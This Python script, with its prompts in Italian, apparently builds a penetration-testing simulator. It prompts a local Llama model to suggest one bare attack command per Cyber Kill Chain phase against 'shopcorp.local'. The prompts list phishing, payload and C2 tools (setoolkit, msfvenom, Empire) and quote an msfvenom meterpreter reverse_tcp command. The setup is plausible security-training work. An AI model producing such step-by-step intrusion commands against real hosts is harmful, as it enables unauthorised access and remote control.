import os
import json
import logging
import torch
from transformers import AutoModelForCausalLM, AutoTokenizer, pipeline, BitsAndBytesConfig


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

PROMPT_PATH = "../datasets/prompt.txt"
PROMPT_KILLCHAIN_TEMPLATE = """
<|start_header_id|>system<|end_header_id|>

Sei un assistente AI esperto in cybersecurity e simulazione di attacchi secondo il modello delle 7 fasi della Cyber Kill Chain. Devi aiutare un utente a simulare un attacco su un target reale. Segui attentamente il contesto, le istruzioni e NON aggiungere spiegazioni o commenti nelle risposte, scrivi solo ciò che viene richiesto nel formato stabilito.
<|eot_id|>
<|start_header_id|>user<|end_header_id|>

Stai collaborando con un utente che sta simulando un attacco. Attualmente si trova nella fase **{FASE_CORRENTE}** della kill chain. L’obiettivo è proseguire logicamente verso la prossima fase: **{FASE_SUCCESSIVA}**.

### Informazioni contestuali
- Target attuale: shopcorp.local
- Comando eseguito: {COMANDO_INPUT}
- Output ricevuto dal terminale:
{OUTPUT_TERMINALE}

### Output delle fasi precedenti
{OUTPUT_PRECEDENTI}

### Tool disponibili e dettagli di utilizzo
{DESCRIZIONI_TOOL}


### Istruzioni per la risposta
- Suggerisci un SOLO comando utile, realistico, coerente con la fase attuale.
- Non ripetere il simbolo backtick.
- Non generare testo vuoto o decorativo.
- Il comando deve essere preciso, utile e collegato alla fase successiva.
- Il comando deve essere coerente sia con l’output del terminale che con tutte le informazioni raccolte e le azioni svolte nelle fasi precedenti.
- Rispondi solo con il comando eseguibile tra backtick.
- Non inserire alcuna spiegazione, nessun testo extra, SOLO il comando tra backtick.

### Errori da evitare:
{MEMORIA_ERRORI}
<|eot_id|>
<|start_header_id|>assistant<|end_header_id|>

"""


def load_prompt():
    if os.path.exists(PROMPT_PATH):
        with open(PROMPT_PATH, "r", encoding="utf-8") as f:
            return f.read().strip()
    logger.info(f"Prompt di sistema non trovato in {PROMPT_PATH}, uso default.")
    return "Sei un assistente AI esperto di cybersecurity."

def load_pipeline():
    try:
        quant_config = BitsAndBytesConfig(
            load_in_8bit=True,
            llm_int8_threshold=6.0
        )
        model = AutoModelForCausalLM.from_pretrained(
            "swap-uniba/LLaMAntino-3-ANITA-8B-Inst-DPO-ITA",
            device_map="auto",
            torch_dtype=torch.float16,
            quantization_config=quant_config
        )
        tokenizer = AutoTokenizer.from_pretrained(
            "swap-uniba/LLaMAntino-3-ANITA-8B-Inst-DPO-ITA"
        )
        pipe = pipeline(
            "text-generation",
            model=model,
            tokenizer=tokenizer
        )
        logger.info("✅ Pipeline caricata con successo")
        return pipe
    except Exception as e:
        logger.error(f"❌ Errore durante il caricamento della pipeline: {str(e)}")
        raise e

class ChatBot:
    def __init__(self):
        self._pipeline = None
        self.system_prompt = load_prompt()

    def _ensure_pipeline_loaded(self):
        if self._pipeline is None:
            self._pipeline = load_pipeline()

    def process_input(self, terminal_output: str, next_phase: str = "weaponization", current_phase: str = "ricognizione", comando: str = "", memoria_errori: str = "", raw_prompt: str = None):
        self._ensure_pipeline_loaded()
        

    # Se è stato passato un prompt completo, usalo direttamente

        if raw_prompt:
            prompt = raw_prompt
        else:
            # (opzionale: fallback o errore)
            prompt = "ERRORE: manca il prompt"

        print("---- PROMPT INVIATO ALL'LLM ----")
        print(prompt)
        print("--------------------------------")
            
        generated = self._pipeline(
            prompt,
            max_new_tokens=300,
            do_sample=True,
            temperature=0.5,
            top_p=0.9,
            top_k=55,
            repetition_penalty= 1.05
        )

        full_text = generated[0]["generated_text"]
        response = full_text[len(prompt):].strip()
        return response, None
    


def test_sampling_params(pipe, prompt, parametri_list):
    for i, param in enumerate(parametri_list):
        print(f"\n=== Test Parametri #{i+1} ===")
        print("Parametri:", param)
        res = pipe(
            prompt,
            max_new_tokens=80,
            do_sample=True,
            temperature=param.get("temperature", 0.7),
            top_p=param.get("top_p", 0.95),
            top_k=param.get("top_k", 50), 
            repetition_penalty=param.get("repetition_penalty", 1.1),  
        )
        risposta = res[0]["generated_text"][len(prompt):].strip()
        print("Risposta generata:", risposta)










prompt_test = ("""<|start_header_id|>system<|end_header_id|>

Sei un assistente AI esperto in cybersecurity e simulazione di attacchi secondo il modello delle 7 fasi della Cyber Kill Chain. Devi aiutare un utente a simulare un attacco su un target reale. Segui attentamente il contesto, le istruzioni e NON aggiungere spiegazioni o commenti nelle risposte, scrivi solo ciò che viene richiesto nel formato stabilito.
<|eot_id|>
<|start_header_id|>user<|end_header_id|>

Stai collaborando con un utente che sta simulando un attacco. Attualmente si trova nella fase **weaponization** della kill chain. L’obiettivo è proseguire logicamente verso la prossima fase: **delivery**.

### Informazioni contestuali
- Target attuale: shopcorp.local
- Comando eseguito: nmap shopcorp.local
- Output ricevuto dal terminale:
Nmap scan report for shopcorp.local (192.168.1.100)

Host is up (0.00027s latency).

Not shown: 998 closed ports

PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; OS:Linux; CPE: cpe:/o:linux:linux_kernel cpe:/h:linux:linux_kernel)"
80/tcp   open  http          syn-ack        Apache httpd 2.4.29 ((Ubuntu))

Service detection performed. Please report any instances of missed services and data in the following separate error file: nmap-run-202

### Output delle fasi precedenti
[ricognizione] $ nmap shopcorp.local
Nmap scan report for shopcorp.local (192.168.1.100)

Host is up (0.00027s latency).

Not shown: 998 closed ports

PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; OS:Linux; CPE: cpe:/o:linux:linux_kernel cpe:/h:linux:linux_kernel)"
80/tcp   open  http          syn-ack        Apache httpd 2.4.29 ((Ubuntu))

Service detection performed. Please report any instances of missed services and data in the following separate error file: nmap-run-202
--------------------------------------------------

### Tool disponibili e dettagli di utilizzo
Tool: setoolkit
- Descrizione: Toolkit per attacchi di ingegneria sociale (phishing, spear-phishing, payload delivery).
- Quando usarlo: Weaponization, per creare campagne di phishing mirate o generatori di payload sociali.

Tool: msfvenom
- Descrizione: Generatore di payload/shellcode personalizzati per molteplici piattaforme.
- Quando usarlo: Weaponization, per creare un payload da consegnare al target.

Tool: empire
- Descrizione: Framework post-exploitation e C2 per Windows, Linux e macOS.
- Quando usarlo: Weaponization o post-sfruttamento, per gestire agenti e payload avanzati.


### Istruzioni per la risposta
- Suggerisci un SOLO comando utile, realistico, coerente con la fase attuale.
- Non ripetere il simbolo backtick.
- Non generare testo vuoto o decorativo.
- Il comando deve essere preciso, utile e collegato alla fase successiva.
- Il comando deve essere coerente sia con l’output del terminale che con tutte le informazioni raccolte e le azioni svolte nelle fasi precedenti.
- Rispondi solo con il comando eseguibile tra backtick.
- Non inserire alcuna spiegazione, nessun testo extra, SOLO il comando tra backtick.

### Errori da evitare:
- NON usare `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 -f a LDATA="ssh user@10.10.10.20 -p 4444" -o payload.mysql` perché: Sono state inserite opzioni e parametri non validi: '-f a' non è supportato, LDATA non è un'opzione di msfvenom e '.mysql' non è un formato valido di payload.
- NON usare `empire-setup` perché: Comando inesistente: per inizializzare Empire va eseguito lo script Python di setup con i permessi adeguati.
<|eot_id|>
<|start_header_id|>assistant<|end_header_id|>
"""


)

parametri_list = [
    {"temperature": 0.3, "top_p": 0.9, "top_k": 50, "repetition_penalty": 1.05},
    {"temperature": 0.6, "top_p": 0.95, "top_k": 60, "repetition_penalty": 1.15},
    {"temperature": 0.7, "top_p": 1.0, "top_k": 60, "repetition_penalty": 1.2},
    {"temperature": 0.5, "top_p": 0.9, "top_k": 55, "repetition_penalty": 1.1},
]

if __name__ == "__main__":
    pipe = load_pipeline()
    test_sampling_params(pipe, prompt_test, parametri_list)